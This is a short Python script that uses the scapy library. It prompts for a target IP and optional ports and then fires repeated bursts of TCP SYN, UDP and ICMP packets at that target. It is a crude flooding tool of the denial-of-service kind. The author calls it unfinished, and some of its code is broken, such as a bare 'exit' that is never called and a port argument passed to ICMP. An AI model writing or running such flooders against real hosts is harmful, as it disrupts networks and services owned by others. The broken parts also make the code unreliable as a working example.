import subprocess; from scapy.all import IP, TCP, UDP, ICMP, send # type: ignore // pip install scapy --python C:\path\to\python 
# TUI TOOL STYLE WITH NO GUARANTEE IT WORKS BC I CANT BE BOTHERED TO KEEP WORKING ON THIS 
try:
	while True:
		# subprocess.call('cmd /S /C cls') 
		pcount = 0 
		print("Use 'exit' in text input fields, otherwise ^C to quit.") 
		ip = input("Input the target IP:\n > ") 
		if ip == "exit": exit 
		ports = input("[optional] Input the target ports (comma-separated list):\n > ") 
		if ports == "exit": exit 
		if (ports == None) | (ports == (str())):
			try:
				pping = subprocess.check_output(f"ping {ip}") 
				print(f"Pre-check:\n{pping}\n\nCancel at any time with ^C") 
			except Exception as e:
				print("Pre-check failed:", e) 
			subprocess.call("timeout /T -1") 
			try:
				packet = IP(dst=ip) / TCP(flags="S") 
				for x in range(200):
					send(packet); pcount += 1 
					print(f"{pcount}: \tSent TCP SYN packet no. {x} to {ip}") 
				packet = IP(dst=ip) / UDP() 
				for y in range(200):
					send(packet); pcount += 1 
					print(f"{pcount}: \tSent UDP packet no. {y} to {ip}") 
				packet = IP(dst=ip) / ICMP() 
				for z in range(200):
					send(packet); pcount += 1 
					print(f"{pcount}: \tSent ICMP/PING packet no. {z} to {ip}") 
			except KeyError as e:
				print("Packet failed; KeyError:", e) 
			continue
		else:
			port_list = ports.split(",") 
			try:
				pping = subprocess.check_output(f"ping {ip}:{port_list[0]}") 
				print(f"Pre-check:\n{pping}\n\nCancel at any time with ^C") 
			except Exception as e:
				print("Pre-check failed:", e) 
			subprocess.call("timeout /T -1") 
			try:
				for i in range(len(port_list)):
					packet = IP(dst=ip) / TCP(dport=port_list[i], flags="S") 
					for x in range(200):
						send(packet); pcount += 1 
						print(f"{pcount}: \tSent TCP SYN packet no. {x} to port {port_list[i]} @ {ip}") 
					packet = IP(dst=ip) / UDP(dport=port_list[i]) 
					for y in range(200):
						send(packet); pcount += 1 
						print(f"{pcount}: \tSent UDP packet no. {y} to port {port_list[i]} @ {ip}") 
					packet = IP(dst=ip) / ICMP(dport=port_list[i]) 
					for z in range(200):
						send(packet); pcount += 1 
						print(f"{pcount}: \tSent ICMP/PING packet no. {z} to port {port_list[i]} @ {ip}") 
			except KeyError as e:
				print("Packet failed; KeyError:", e) 
				continue
except KeyboardInterrupt:
	exit 